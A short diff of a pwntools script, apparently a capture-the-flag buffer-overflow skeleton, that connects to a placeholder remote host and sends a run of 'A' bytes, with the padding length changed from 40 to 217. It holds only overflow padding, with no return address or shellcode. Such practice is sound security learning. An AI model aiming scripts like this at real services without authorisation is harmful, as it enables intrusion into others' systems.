@@ -1,10 +1,10 @@
 from pwn import *
 
 # setup process
-p = remote("ip", port)
+p = remote("IP", PORT)
 
 # payload 
-payload = b'A' * 40
+payload = b'A' * 217
 
 # send payload
 p.sendline(payload)
